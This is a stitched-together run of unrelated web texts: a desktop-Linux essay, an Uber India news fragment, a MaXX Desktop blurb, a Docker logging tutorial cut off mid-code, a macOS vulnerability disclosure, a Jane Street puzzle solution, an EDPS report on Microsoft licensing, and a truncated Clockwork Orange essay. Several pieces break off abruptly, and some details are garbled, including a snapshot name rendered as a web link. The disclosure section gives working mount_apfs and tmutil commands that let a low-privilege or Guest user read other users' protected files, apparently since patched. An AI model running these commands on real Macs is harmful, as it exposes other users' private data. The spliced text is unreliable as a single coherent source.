<p>That model of switching explains why companies that are otherwise competitors seem willing to support one another by releasing their own applications on each others’ stacks. When Apple and Microsoft are in competition, we’ve already seen that Microsoft’s applications give them leverage over Apple: they also allow Apple customers to be fringe players in the Microsoft sandpit, which may lead them to switch (for example when they see how much easier it is for their Windows-using colleagues to use all of the Microsoft collaboration tools their employers use). But Apple’s applications also give them leverage over Microsoft: the famed “halo effect” of Mac sales being driven by the iPod fits this model: you buy an iPod because it’s cool, and you use iTunes for Windows. Then you see how much better iTunes for Mac works, and your next computer is a Mac. The application is a gateway to the stack.</p>





<p>What has all of this got to do with desktop Linux? Absolutely nothing, and that’s my point. There’s never been a “halo effect” for the Free Software world because there’s never been a nucleus around which that halo can form. The <a href="http://catb.org/~esr/writings/cathedral-bazaar/cathedral-bazaar/">bazaar model</a> does a lot to ensure that. Let’s take a specific example: for many people, Thunderbird is the best email client you can possibly get. It also exists on multiple stacks, so it has the potential to be a “gateway” to desktop Linux.</p>





<p>But it won’t be. The particular bazaar hawkers working on Thunderbird don’t have any particular commitment to the rest of the desktop Linux stack: they’re not necessarily against it, but they’re not necessarily for it either. If there’s an opportunity to make Thunderbird better on Windows, anybody can contribute to exploit that opportunity. At best, Thunderbird on desktop Linux will be as good as Thunderbird anywhere else. Similarly, the people in the Nautilus file manager area of the bazaar have no particular commitment to tighter integration with Thunderbird, because their users might be using GNUMail or Evolution.</p>





<p>At one extreme, the licences of software in the bazaar dissuade switching, too. Let’s say that CUPS, the common UNIX printing subsystem, is the best way to do printing on any platform. Does that mean that, say, Mac users with paper-centric workflows or lifestyles will be motivated to switch to desktop Linux, to get access to CUPS? No, it means Apple will take advantage of the CUPS licence to integrate it into their stack, giving them access to the technology.</p>





<p>The only thing the three big stack vendors seem to agree on when it comes to free software licensing is that the GPL version 3 family of licences is incompatible with their risk appetites, particularly their weaponised patent portfolios. So that points to a way to avoid the second of these problems blocking a desktop Linux “halo effect”. Were there a GPL3 killer app, the stack vendors probably wouldn’t pick it up and integrate it. Of course, with no software patent protection, they’d be able to reimplement it without problem.</p>





<p>But even with that dissuasion, we still find that the app likely wouldn’t be a better experience on a desktop Linux stack than on Mac, or on Windows. There would be no halo, and there would be no switchers. Well, not no switchers, but probably no more switchers.</p>





<p>Am I minimising the efforts of consistency and integration made by the big free software desktop projects, KDE and GNOME? I don’t think so. I’ve used both over the years, and I’ve used other desktop environments for UNIX-like systems (please may we all remember CDE so that we never repeat it). They are good, they are tightly integrated, and thanks to the collaboration on specifications in the Free Desktop Project they’re also largely interoperable. What they aren’t is breakout. Where Thunderbird is a nucleus without a halo, Evolution is a halo without a nucleus: it works well with the other GNOME tools, but it isn’t a lighthouse attracting users from, say, Windows, to ditch the rest of their stack for GNOME on Linux.</p>





<p>Desktop Linux is a really good desktop stack. So is, say, the Mac. You could get on well with either, but unless you’ve got a particular interest in free software, or a particular frustration with Apple, there’s no reason to switch. Many people do not have that interest or frustration.</p>

<a target="_blank" href="https://www.cbsnews.com/news/uber-earnings-q1-161-million-loss-ridership-falls-3-percent/" rel="nofollow">said</a> during the conference call for its earnings. 
</p><p>
Earlier, as a part of its massive global layoff of 6,700 employees, Uber India had laid off 600 employees in India. “The impact of Covid-19 and the unpredictable nature of the recovery has left Uber IndiaSA with no choice but to reduce the size of its workforce. Around 600 full time positions across driver and rider support, as well as other functions, are being impacted. These reductions are part of previously announced global job cuts this month,” Pradeep Parameswaran, President, Uber India and South Asia had said during the layoffs in May 2020. 
</p><p><span>Advertisement</span></p><hr><p>However, Uber’s wish to shift its engineering to India is not something new. During his visit to India in 2019, Khosrowshahi had said that India is going to be a big source of innovation for them. “One example is the Uber Lite app, was designed and built in India and moved to over 30 countries around the world,” he had said.
</p><p>
Manik Gupta who was then the Chief Product Officer of Uber had said that Uber is proud of the engineering and product talent based out of Bengaluru and Hyderabad. “We have a goal to double the headcount in these offices and have 1,000 people to build innovative products out of India,” he had said.

<h3 id="bkmrk-introduction">Introduction</h3>
<p id="bkmrk-the-maxx-interactive">The MaXX Interactive Desktop a.k.a.&nbsp; MaXX Desktop or MID is the continuation of the 5dwm.org project released many years back. &nbsp; By the way, the 5dwm.org website is not associated with us anymore and we do not endorse its content, although it's ours and was miss-appropriated from us a few years ago.&nbsp; Back to our regular program :)&nbsp; So don't be mistaken, there is only one other real implementation of the IRIX Interactive Desktop(IID) and&nbsp; it's MaXX Desktop!</p>
<p id="bkmrk-more-info-on-the-ori"><a title="Not just a theme..." href="https://maxxinteractive.com/books/misc/page/not-just-a-theme"><strong>&gt;&gt; More details on what MaXX Desktop is made of</strong></a></p>
<h3 id="bkmrk-our-mission"><br>Our Mission</h3>
<p id="bkmrk-our-goal-is-to-bring">Our mission is to bring back this great user experience which focused on performance, stability and productivity while sporting a smooth-clean-minimalism look and feel&nbsp; with low-resources consumption. A smart desktop that puts the user's application in the forefront.&nbsp; <em><strong>More for your creativity.</strong></em></p>
<p id="bkmrk-so-there-is-no-surpr">So there is no surprises here, MaXX Desktop is a highly tuned Workstation Environment which can leverage&nbsp; multi-core&nbsp; workload processing, robust asynchronous multi-threaded POSIX Messaging, hardware acceleration and GPU specific optimizations that&nbsp; makes the MaXX Desktop so fast, light-weight and dependable. Enough geekin' out for now, although, we are and proud to be.</p>
<p id="bkmrk-maxx-desktop-is-a-tr">MaXX Desktop is a true re-implementation of the SGI Desktop while respecting the classic/retro SGI look and feel (which is very important for us to get it right), but also to expand and build on top of those solid foundations with a more modern-current user experience.&nbsp; See it as the <em>classic</em> or<em>original&nbsp;</em> look and feel of the desktop and a new <em>modern</em> take.&nbsp; We want the modern look to be/feel like a natural evolution of the classic SGI look, as if SGI did it themselves throughout several years perfecting an already pretty awesome recipe. &nbsp; The modern look still supports SGI Color Schemes and introduce UTF-8 support, anti-aliased font rendering, more hardware acceleration and a new virtual-desktop manager.</p>
<p id="bkmrk-we-believe-in-a-high">We believe in a High Performance Desktop Environment that provides the right set of tools to maximize creativity and productivity without sacrificing&nbsp; your system resources to some eye candy non-sense.&nbsp;<em> <strong>Again, less is more... And it keeps you focused.<br></strong></em></p>
<h3 id="bkmrk-from-the-ground-up">From the Ground Up</h3>
<p id="bkmrk-maxx-desktop-is-desi">The MaXX&nbsp; Desktop is designed from the ground up for speed,&nbsp; fast/responsive, lightweight/simplicity over eye-candidness, but more importantly, to get the heck out of your way... The name <em>MaXX Interactive</em> doesn't mean maximum visual interaction, which are distractions or so what we call, UI noises. It's means maximum creativity with interactive assistance from the Desktop. In may ways, it's made for you and your brain so that it can relax, focus on let the creative juice flowing with far fever distractions. We see desktop notifications in a very different way, but this is for another discussion. In short, the MaXX Desktop let you focus on the creative&nbsp; tasks ahead without interference or visual distractions.<em><strong>&nbsp; Our design philosophy is simple, do more with less...</strong></em></p>
<h3 id="bkmrk-experience-matter">Experience Matters</h3>
<p id="bkmrk-finally%2C-our-team-me">Our team is sharing the same vision of making use of the right set of technologies, using industry proven best practices and guide lines to build the right software, the right way.&nbsp; We aim at providing a consistent and pleasant user experience built on top of modern and stable foundations but yet flexible.&nbsp; Every good and useful piece of tech deserves to be future-proof...&nbsp; This is where&nbsp; several decades of experience in building battle-proven mission critical systems and high performance Enterprise class applications comes in.&nbsp; If it's architect-ed properly,&nbsp; it can evolve without breaking apart!</p>
<h3 id="bkmrk-is-maxx-desktop-for-">Is MaXX Desktop for you?</h3>
<p id="bkmrk-maxx-desktop%27s-typic">MaXX Desktop's typical users are: 2D/3D Computer Graphics Artists, Motion Pictures and Special Effects Studios, Software/Game Developers, Visualization/Simulation, Virtual Reality power-users or Oil and Gas research to name a few.&nbsp; MaXX Desktop is also for anyone who wants get a break from all the surrounding noises and to create stuff while sporting a very unique/cool daily driver!&nbsp; <em><strong>Then, MaXX&nbsp; is for you too!&nbsp;</strong></em></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <p>Docker allows us to stream logs to different places with plugins called logging drivers.</p>
<p>How to change logging driver? What’s the most popular ones?</p>

<p>Docker has got two types of logging drivers:</p>
<ul>
<li>built-in like:
<ul>
<li><code>awslogs</code></li>
<li><code>fluentd</code></li>
<li><code>gcplogs</code></li>
<li><code>gelf</code></li>
<li><code>journald</code></li>
<li><code>json-file</code></li>
<li><code>local</code></li>
<li><code>logentries</code></li>
<li><code>splunk</code></li>
<li><code>syslog</code></li>
</ul>
</li>
<li>external drivers that we can install with <code>docker plugin install</code></li>
</ul>
<p>Logging driver is used to forward logs from containers to specific log aggregators, widely known rsyslog or fluentd for example.</p>
<p>Default logging driver after installation is <code>json-file</code>.</p>
<p>It is important to test non default logging drivers before using on production - problems with logging can cause crash/hang or startup problems with containers.</p>
<h2 id="check-default-logging-driver">Check default logging driver</h2>
<p>This is driver that docker daemon will use for itself and containers that won’t have set explicit another driver at start</p>
<div><pre><code data-lang="bash"><span>[</span>lukas@docker-host1 ~<span>]</span>$ docker info --format <span>'{{.LoggingDriver}}'</span>

        <h2 id="tldr">TL;DR</h2>
<p>We could mount the entire file system through APFS snapshots as read-only, with the <code>noowners</code> flag, which enables us accessing (almost) every file in the file system, including data (documents, files, etc…) of every user on the system, including those protected by Apple’s privacy framework (TCC). Even with the Guest account we could read files of admin accounts as Guest! 😱</p>
<p>This could be achieved with a single command, for example:
<code>mount_apfs -o noowners -s http://com.apple.TimeMachine.2019-11-17-141812.local /System/Volumes/Data /tmp/snap</code></p>
<p>This has been fixed in macOS Catalina 10.15.4 and on Mojave on the 26th of May.</p>
<h2 id="the-issues">The Issues</h2>
<p>There were two separate issues in this bug, and the combination of those became a very powerful system wide access.</p>
<ol>
<li>TCC privacy is not enforced on mounted local snapshots allowing someone to mount it and access any file inside, including those normally privacy protected</li>
<li>Initiating an APFS snapshot is available for all users, even low privileged ones, as well as listing of those. Beyond that, all users can mount local APFS snapshots, even a low privilege ones, and if used with the <code>noowners</code> flag, the low privilege user can access all data through the local snapshot, including every other users’ data (even high privileged one).</li>
</ol>
<h2 id="1-privacy-bypass">1. Privacy bypass</h2>
<p>From Terminal we can get a list of local snapshots available:</p>
<pre><code>% tmutil listlocalsnapshots /System/Volumes/Data
Snapshots for volume group containing disk /System/Volumes/Data:
com.apple.TimeMachine.2019-11-15-202744.local
com.apple.TimeMachine.2019-11-16-135116.local
com.apple.TimeMachine.2019-11-16-145028.local
com.apple.TimeMachine.2019-11-16-162241.local
com.apple.TimeMachine.2019-11-16-182353.local
com.apple.TimeMachine.2019-11-16-214156.local
com.apple.TimeMachine.2019-11-17-112126.local
com.apple.TimeMachine.2019-11-17-122313.local
</code></pre><p>We can mount one:</p>
<pre><code>csaby@mac ~ % /sbin/mount_apfs -o nobrowse,ro -s com.apple.TimeMachine.2019-11-16-182353.local /System/Volumes/Data /tmp/snap
</code></pre><p>If we navigate the user’s folder, we will be able access locations which our protected by TCC.</p>
<pre><code>csaby@mac ~ % ls -l /tmp/snap/Users/csaby/Library/Messages 
total 6224

-rw-r———r———   1 csaby  staff  1520312 Nov 16 08:09 prewarm.db-wal
</code></pre><p>if we compare it with standard access, it is not permitted:</p>
<pre><code>csaby@mac ~ % ls -l /Users/csaby/Library/Messages
ls: Messages: Operation not permitted
</code></pre><p>This is an issue as we can access every file through the local snapshot mountpoint.</p>
<p>We can also force the creation of a snapshot if there is no one:</p>
<pre><code>csaby@mac ~ % tmutil localsnapshot
Created local snapshot with date: 2019-11-17-140728
</code></pre><p>In short with <code>mount_apfs</code> we can completely bypass privacy protected folders.</p>
<h2 id="2--privilege-escalation">2.  “Privilege escalation”</h2>
<p>Although this method is not a full privilege escalation, as we don’t get higher privileges, however we can access files that belong to higher privilege users, and with the previous finding, this will include TCC protected data.</p>
<p>First, as a low privilege user we can create a local snapshot, and later list it to get its ID (this is not a bug). Although the second is not a hard requirement, as its ID can be figured out based on the time. Also snapshots are auto created by the system, so even if we can’t create one we can find one, and its ID is guessable, because it uses the following format: <code>yyyy-mm-dd-hhmmss</code>.</p>
<p>Here follows the demonstration of the issue. This is the low privileged ID I used:</p>
<pre><code>% id                       
uid=502(n00b) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),100(_lpoperator),702(com.apple.sharepoint.group.2),701(com.apple.sharepoint.group.1)
</code></pre><p>To show that it doesn’t have access to other user’s folder (where by-the-way, <code>csaby</code> is an admin user):</p>
<pre><code>n00b@mac Messages % ls -l /Users/csaby/Library 
ls: Library: Permission denied
</code></pre><p>Let’s create and list local snapshots:</p>
<pre><code>n00b@mac Messages % tmutil localsnapshot
Created local snapshot with date: 2019-11-17-141812

% tmutil listlocalsnapshots /
Snapshots for volume group containing disk /:
com.apple.TimeMachine.2019-11-17-133110.local
com.apple.TimeMachine.2019-11-17-133316.local
com.apple.TimeMachine.2019-11-17-141812.local
</code></pre><p>We can mount the snapshot with <code>noowners</code>, which according to the <code>manpage</code> means:</p>
<blockquote>
<p>Ignore the ownership field for the entire volume.  This causes all objects to appear as owned by user ID 99 and group ID 99.  User ID 99 is interpreted as the current effective user ID, while group ID 99 is used directly and translates to `unknown’.</p>
</blockquote>
<pre><code>n00b@mac Messages % mount_apfs -o noowners -s com.apple.TimeMachine.2019-11-17-141812.local /System/Volumes/Data /tmp/snap
mount_apfs: snapshot implicitly mounted readonly
</code></pre><p>And finally we can access all data from there as the privileges set for our user:</p>
<pre><code>% cd /tmp/snap/Users/csaby 
n00b@mac csaby % ls -l Library/Messages 
total 4704
-rw-r--r--  1 n00b  staff   258048 Nov  9 14:41 chat.db
-rw-r--r--  1 n00b  staff    32768 Nov 17 13:29 chat.db-shm
-rw-r--r--  1 n00b  staff  1507952 Nov  9 14:41 chat.db-wal
</code></pre><p>We can perform this attack even as a <code>Guest</code> account if FileVault is not turned ON. If FileVault is ON, Guest can only run Safari (after a reboot), and also the user data will be encrypted, so even if someone can break out the kiosk mode and start <code>Terminal</code> and run the above commands, he/she wouldn’t see the contents.</p>
<h2 id="the-fix-">The “Fix” 😭</h2>
<p>This requires some longer explanation as IMO the fix provided by Apple is not right.</p>
<p>At the beginning of March 2020, Apple said that the fix is shipped in Catalina 10.15.4 beta, they didn’t tell a word how they fixed it. I quickly jumped on it, and I found that the trick still works. I was puzzled. After some testing it turned out that they tied this to the Full Disk Access (FDA) right in TCC (<code>kTCCServiceSystemPolicyAllfiles</code>), which I found wrong. This is what I wrote them on the 13th of March:</p>
<blockquote>
<p>I did one more test and turned off “Full Disk Access” for Terminal, and then it indeed stopped working. I don’t consider this as a fix, relaying on TCC stopping this is a bad move in my opinion, most people will have Terminal set to “Full Disk Access”.</p>
<p>This still violates the basic BSD security model, as you can read other user’s file, without elevating to root. <strong>Even if SIP is OFF and Terminal has “Full Disk Access”, you shouldn’t be able to mount anything with “noowners” unless you are root</strong>. **The mount operation itself should fail.**If you think about it: Even if SIP is ON and Terminal has Full Disk Access, you can’t see other user’s files with it - with this vulnerability you can.</p>
<p>“Full Disk Access” TCC setting is global, which means that if an admin user enables this, a low privileged user can use Terminal to access the admin user’s files.</p>
</blockquote>
<p>I got a reply the same day:</p>
<blockquote>
<p>Thank you for providing additional information. We will investigate.</p>
</blockquote>
<p>After this point we went into, what I call “black hole mode”, I never got replies to my emails, and than <code>CVE-2020-9771</code> became public on the 26th of May. They shipped the fix to Mojave on that day (<a href="https://support.apple.com/en-us/HT211170),">https://support.apple.com/en-us/HT211170),</a> and retroactively updated the 10.15.4 security notes the same day with this CVE (<a href="https://support.apple.com/en-us/HT211100">https://support.apple.com/en-us/HT211100</a>). I tested this again, and I found the same behavior. At this point I still didn’t know if they considered this fixed or not, as no one came back to me. Their description “This issue was addressed with a new entitlement.” is extremely misleading.</p>
<p>I sent an email again on May 27th (still in “black hole mode”):</p>
<blockquote>
<p>I want to ask again if you consider this fixed via controlling this “exploit” via the “Full Disk Access” permission in TCC. As noted earlier I think it’s not right.</p>
</blockquote>
<p>Finally on the 29th of June I got a reply:</p>
<blockquote>
<p>This issue was addressed with macOS Catalina 10.15.5 and assigned CVE-2020-9771 -&gt;  <a href="https://support.apple.com/HT211170">https://support.apple.com/HT211170</a> . We are not planning any additional changes in this area.</p>
<p>macOS Catalina has improvements which have reduced the need for applications run through Terminal to require Full-Disk Access, and it should not be enabled by a user unless necessary.</p>
</blockquote>
<p>That’s it, not much I can do about this anymore, I only hope that it will get enough public attention, with many disappointed users about the fix, that 🍎 will reconsider the fix.</p>
<h2 id="conclusion">Conclusion</h2>
<p>The “Full Disk Access” right starts to get too much power these days, beyond controlling file access now it controls mounting, and also EndpointSecurity extensions.</p>
<p>This means that a user must be extremely careful which app is granted FDA right, because that will be able to access every user file on the system. If we grant for example <code>Terminal</code> this right, a low privilege user will be able to read our files through the app.</p>
<p>So until this is changed, please triple check what gets this right and what not.</p>

<h3 id="circle-time">Circle Time</h3>

<p>Every month, Jane Street Capital post a puzzle on their website.  This was the puzzle for <a href="https://www.janestreet.com/puzzles/circle-time/">June 2020</a>.</p>

<blockquote>
  <p>Call a “ring” of circles a collection of six circles of equal radius, say r, whose centers lie on the six vertices of a regular hexagon with side length 2r. This makes each circle tangent to its two neighbors, and we can call the center of the regular hexagon the “center” of the ring of circles. If we are given a circle C, what is the maximum proportion of the area of that circle we can cover with rings of circles entirely contained within C that all are mutually disjoint and share the same center?</p>
</blockquote>

<h3 id="solution">Solution</h3>

<p>I think the most difficult step in this months puzzle was to translate the problem statement above into a visual representation, as shown below.  If you got this far, you probably were able to solve the puzzle.</p>

<p><img width="600" src="https://willemhoek.com/images/janestreet-202006_1a.png"></p>

<p>Due to the symmetry of a hexagon, the ratio of the radius of two adjacent ring of circles are always the same.  Basic trigonometry was required to determine this ratio.</p>

<p>We now have a single equation, single variable.</p>

<h3 id="method-1-to-solve-the-equation-goal-seek-in-excel">Method 1 to solve the equation: Goal Seek in Excel</h3>

<p>I used the “Goal Seek” function in Excel to resolve <em>k</em>.</p>

<p>In Excel: select the <strong>Data</strong> tab, in the <strong>Data Tools</strong> group, click <strong>What-If Analysis</strong>, and then click <strong>Goal Seek</strong>.</p>

<h2>EDPS Public Paper on</h2>

<p>2 July 2020</p>
<div>
<p>The European Data Protection Supervisor (EDPS) is the independent supervisory authority established by Article 52 of <a href="https://eur-lex.europa.eu/legal-content/EN/TXT/PDF/?uri=CELEX:32018R1725&amp;from=EN">Regulation (EU) 2018/1725</a> responsible for:</p>
<ul>
<li><p>Monitoring and ensuring the application of the provisions of Regulation (EU) 2018/1725 and any other EU act relating to the protection of the fundamental rights and freedoms of natural persons with regard to the processing of personal data by a EU institution or body;</p></li>
<li><p>Advising EU institutions and bodies and data subjects on all matters concerning the processing of personal data.</p></li>
</ul>
<p>To this end, the EDPS fulfils its duties in accordance with Article 57 of Regulation (EU) 2018/1725 and exercises the powers granted in Article 58 of Regulation (EU) 2018/1725.</p>
<p>The power to investigate is one of the tools established to monitor and ensure compliance with Regulation (EU) 2018/1725.</p>
</div>
<div>
<p>This paper presents the issues raised by the EDPS’ own-initiative investigation into European institutions’, bodies’, offices’ and agencies’ (‘EU institutions’) use of Microsoft products and services. These findings and recommendations from the investigation are likely to be of wider interest than just of the EU institutions: they may be of particular interest to all public authorities in EU/EEA Member States.</p>
<p>The EDPS assessed the compliance of the licensing agreement between Microsoft and the EU institutions against the requirements laid down in Regulation (EU) 2018/1725<span data-cites="regulation20181725"><a href="#fn1" id="fnref1" role="doc-noteref"><sup>1</sup></a></span> which sets out the rules for data protection in the EU institutions, bodies, offices and agencies as well as the duties and powers of the European Data Protection Supervisor (EDPS).</p>
<p>In the interest of a coherent approach to personal data protection throughout the Union, and the free movement of personal data within the Union, the legislators aligned Regulation (EU) 2018/1725 as far as possible with the data protection rules of Regulation (EU) 2016/679<span data-cites="gdpr"><a href="#fn2" id="fnref2" role="doc-noteref"><sup>2</sup></a></span> (‘General Data Protection Regulation’ - GDPR). Whenever the provisions of Regulation (EU 2018/1725 follow the same principles as the provisions of the GDPR, these two sets of provisions should, under the case law of the Court of Justice of the European Union be interpreted homogeneously, in particular because the scheme of this Regulation should be understood as equivalent to the scheme of the GDPR.</p>
<p>The EDPS made the following key findings in its investigation into the EU institutions’ use of Microsoft products and services.</p>
<p>First, the licensing agreement between Microsoft and the EU institutions allowed Microsoft to define and change the parameters of its processing activities carried out on behalf of EU institutions and contractual data protection obligations. The discretion that Microsoft had, amounted to a broad right for Microsoft to act as a controller. Given the EU institutions’ role as public service institutions, the EDPS did not consider this appropriate. The EDPS recommended to EU institutions that they act to retain controllership.</p>
<p>Second, EU institutions needed to put in place a comprehensive and compliant controller-processor agreement and documented instructions of the EU institutions to the processors. Their lack of control over which sub-processors Microsoft used and lack of meaningful audit rights also presented significant issues. The EDPS made recommendations on how to improve the controller-processor agreement and put robust audit checks in place.</p>
<p>Third, EU institutions faced a number of linked issues concerning data location, international transfers and the risk of unlawful disclosure of data. They were unable to control the location of a large portion of the data processed by Microsoft. Nor did they properly control what was transferred out of the EU/EEA and how. There was also a lack of proper safeguards to protect data that left the EU/EEA. EU institutions also had few guarantees at their disposal to defend their privileges and immunities and ensure that Microsoft would only disclose personal data insofar as permitted by EU law. The EDPS made recommendations to assist EU institutions in addressing these issues.</p>
<p>Fourth, the EDPS considered the technical measures that the Commission had put in place to stem the flow of personal data generated by Microsoft products and services and sent to Microsoft. The EDPS recommended that all EU institutions perform tests using a revised and comprehensive approach, share among them the knowledge and technical solutions they developed to prevent unauthorised data flows to Microsoft and inform each other of any data protection issues they identify with the products or services.</p>
<p>Fifth, the EU institutions had insufficient clarity as to the nature, scope and purposes of the processing and the risks to data subjects to be able to meet their transparency obligations towards data subjects. The EDPS recommended that EU institutions seek the clarity and assurances allowing them to keep data subjects properly informed.</p>

<h2 data-number="1.1" id="context"> Context</h2>
<p>This paper presents the issues raised by the EDPS’ own-initiative investigation into European institutions’, bodies’, offices’ and agencies’ (‘EU institutions’) use of Microsoft products and services. It presents the EDPS’ findings and recommendations from the investigation to be shared with a wider audience, applying a high standard of transparency<a href="#fn3" id="fnref3" role="doc-noteref"><sup>3</sup></a>, while preserving the necessary confidentiality of certain elements of the EU institutions’ contract and of the EDPS’ investigation.</p>
<p>A large amount of personal data is processed through the EU institutions’ use of Microsoft products and services. Over 45&nbsp;000 staff of EU institutions, including the EDPS, are users of those products and services. In addition, staff use Microsoft products and services to process the personal data of people who are not staff.</p>
<p>The EDPS’ investigation focused on the terms of the <em>Inter-Institutional Licensing Agreement</em> (‘ILA’) that EU institutions signed with Microsoft in 2018. The EDPS also considered the technical measures that the European Commission, as the largest EU institution with a great variety of tasks, had implemented affecting the flow of personal data to Microsoft.</p>
<p>The EDPS issued its findings and recommendations to the EU institutions upon the closure of its investigation in March 2020. The purpose of the EDPS’ report was to provide EU institutions with forward-looking assistance in bringing their arrangements into compliance with data protection law. In particular, the EDPS’ findings and recommendations were oriented towards supporting the renegotiation of the ILA and EU institutions’ contract and implementation of robust technical and organisational measures that should accompany the contract.</p>
<p>EU institutions’ processing of personal data and the EDPS’ own supervisory and investigative powers are governed by Regulation (EU) 2018/1725.<span data-cites="regulation20181725"><a href="#fn4" id="fnref4" role="doc-noteref"><sup>4</sup></a></span> The EDPS assessed the compliance of the ILA against the requirements laid down in that regulation. Although Regulation (EU) 2018/1725 is a data protection regime that is tailored to the EU institutions and distinct from the better-known General Data Protection Regulation<span data-cites="gdpr"><a href="#fn5" id="fnref5" role="doc-noteref"><sup>5</sup></a></span> (‘GDPR’), the overlap between the provisions of Regulation (EU) 2018/1725 and those of the GDPR is extensive.</p>
<p>As a consequence, the EDPS’ findings and recommendations are likely to be of wider interest than to EU institutions.<a href="#fn6" id="fnref6" role="doc-noteref"><sup>6</sup></a> Not only is the law the EDPS applied in its investigation based on the same principles and shares the vast majority of provisions with the GDPR, but the agreement signed by EU institutions is based on standard Microsoft volume-licensing documents and therefore likely to bear similarities to agreements concluded by other organisations. The EDPS’ findings and recommendations may be of particular interest to public authorities in EU member states.</p>
<p>They are also likely to be of relevance beyond the conclusion and implementation of volume licensing agreements for Microsoft products and services. In the EDPS’ view, organisations outsourcing provision or operation of digital services from other service providers are likely to come across similar issues.</p>
<h2 data-number="1.2" id="general-recommendations"> General recommendations</h2>
<p>The EDPS recommended that EU institutions carefully consider any purchases of Microsoft products and services or new uses of existing products and services until after they have analysed and implemented the recommendations of the EDPS. They should involve their Data Protection Officers when deciding how to implement the recommendations of the EDPS. The EU institutions should properly embed data protection in each specific public information and communications technology procurement procedure, specifying the security and data protection measures to be implemented in respect of the particular products and services that are being procured.</p>
<p>This will help EU institutions, from the start, to procure products and services with appropriate contractual and other organisational measures, technical and security measures so that the processing of personal data through those tools complies with Regulation (EU) 2018/1725, in particular with the principle of data protection by design and by default.<span data-cites="regulation20181725"><a href="#fn7" id="fnref7" role="doc-noteref"><sup>7</sup></a></span></p>

    <section>


            <p><em>This week's Viewer film essay: on Stanley Kubrick’s A Classic Orange. What kinds of writing would you like to see from the Viewer? All suggestions much appreciated. Let us know at <a href="mailto:editors@theviewer.is">editors@theviewer.is</a></em></p><hr><p><em>Spoilers Ahead (and for Taxi Driver, Parasite, and Barry Lyndon), and ultraviolence throughout.</em></p><p>Here is a typical character arc: the main character has a problem. They are living life in a self-perpetuating stasis, in need of change. An inciting event comes along to break that stasis, and they are forced to undergo a journey that spits them out as a better person.</p><p>This is a truncated version of Joseph Campbell’s cherished Monomyth, and most stories follow it in some way or other. I’ll call it the Change arc. Stanley Kubrick’s “A Clockwork Orange” follows a much less common pattern: the Repetition arc.</p><figure><img src="https://lh3.googleusercontent.com/HQv_8xSVpcFKDrzqDNxJgvsS8JPqIMbZnzabr8913uvu-NymSz4E-cPRN7WhQQXgmkiWHTf8WK9hP_scbHdyj9kuqw80Okk5XQnHyXF-1s_GDgZ3lpug_UyYSTvShHi2kJ3419hVaTGlRV2iLQ" alt=""></figure><p>The first two stages of the Repetition arc are identical to the Change arc. The hero of “A Clockwork Orange,” Alex DeLarge, is a young hooligan who wanders a futuristic Britain with his street gang the “droogs”, raping, assaulting and defacing everyone and everything that comes in their path. Here we certainly are presented with a problematic, self-perpetuating stasis. One night, during a break-in, Alex is arrested – our inciting event. Over the next few years in prison, he is institutionalized and put through an experimental indoctrination program known as the Ludovico technique, all in a bid to rehabilitate him. This portion of the film serves as his journey, his struggle to become better.</p><p>The treatment initially seems to work – it conditions Alex’s mind to react negatively to sex and violence. He is released back onto the streets. And yet the film doesn’t end with Alex having changed or become a better person – in the last scene, he finds he has lost his aversion to sex and violence and begins once again to experience vulgar sexual fantasies. “I was cured, all right!” he quips. He has returned to his first act stasis; after all his narrative trials and tribulations, nothing has really changed.</p><p>The Repetition arc has been used in many great films. “Taxi Driver” is the story of a disturbed loner who struggles to become better, ending up showered in public praise but just as disturbed as he always was. Bong Joon Ho’s recent critical darling “Parasite” is about a family that strives to be rich and never succeeds; a socio-economic twist on the Repetition arc. Kubrick himself would return to it with the underrated “Barry Lyndon,” the tale of an Irish rogue who tries to deceive his way into a fortune, but ends up alone, crippled and destitute, all of his ambitions having disintegrated.</p><p>The Repetition arc is essentially a pessimistic one. It tells the audience that things never change, that people live in hopeless cycles predetermined by their own characters and that their struggles to achieve moral betterment or success will inevitably collapse in on themselves. One might think that the Repetition arc would be narratively unsatisfying, because it fails to transport the audience. They don’t learn anything from the story. This isn’t the only kind of storytelling technique, though. If done right, symmetry and repetition can be just as narratively cathartic as growth. There is a powerful unity to a story that is bookended by identical scenes and sentiments, a sense of overarching stasis that is almost comforting in its nihilism.</p><p>We know that the Repetition arc is important to Stanley Kubrick’s film, because in the book upon which it is based, Alex <em>does </em>change. Anthony Burgess’ 1962 novel ends with Alex growing discontent with the criminal life and becoming a productive and happy member of society. Surprisingly, his original story is the Change arc incarnate. American publishers insisted on cutting the final chapter so the novel would end on a darker note, lopping off the Change and replacing it with Repetition. Burgess reluctantly agreed, although he called the American version “badly flawed.” When he was adapting the book for the screen, Kubrick opted for the American ending, going so far as to say that he never even considered including that final, redemptive chapter.</p><p>What does the Repetition arc signify in the story of “A Clockwork Orange”?</p><p>Well, both the Repetition and the Change arc start with a problem that the protagonist faces. Alex’s problem is that he is a bad person. He’s bad not because he is misguided, or depressed, or self-centered, or angry, or pretentious, or lazy – he’s simply <em>evil. </em>Burgess, Kubrick and McDowell crafted an amoral man, a man whose entire life is built around delighting in the pain of others. Early in the film, Alex and his droogs pass a homeless man who begs them for money. Cackling, they mercilessly beat him unconscious with their batons.</p><figure><img src="https://lh6.googleusercontent.com/XF63e4X5Q8XUOJm-0coaJNAcaptigvBj82O-Nw055wASuE10JyQgjITik5mxSXmh2SwyrGvfY6dYcaRePH4MweAS1tbw5FRlZxaiuYOUKNH910krDdci7hYShTRQJw9tjVzxrfa7rCDf58MrVA" alt=""></figure><p>The first act of the movie is almost entirely devoted to showing how bad Alex is. One might assume that Kubrick is trying, with these horrific scenes, to distance the audience from Alex, to cut off any possible empathy we might feel for him – but Kubrick said, “Alex symbolizes man in his natural state, the way he would be if society did not impose its ‘civilizing’ processes upon him. What we respond to subconsciously is Alex’s guiltless sense of freedom to kill and rape, and to be our savage natural selves, and it is in this glimpse of the true nature of man that the power of the story derives.” Kubrick wants us to experience Alex’s actions as evil, yes, but also as <em>free</em> – there is a kind of wild, barbaric joy in his ability to act badly and remain unpunished.</p><p>This freedom makes Alex’s eventual arrest and his tortuous imprisonment feel unbearably oppressive. The brand of re-education that he is subjected to is inherently futile – from the government’s perspective, it is a process of rehabilitating and morally improving a delinquent member of society. From our perspective, it is the equivalent of chaining a grizzly bear to a seat and trying to teach it advanced calculus. Although the “Ludovico technique” may subdue and sterilize Alex’s savage character, it can never make him good. Socrates emphasized in several Platonic dialogues that you cannot force someone else to have knowledge. Virtue is an intentional, personal state of the soul. The government has two choices; restrict Alex’s freedom, in which case he is little more than a robot, or let him exercise it, in which case he will leave a 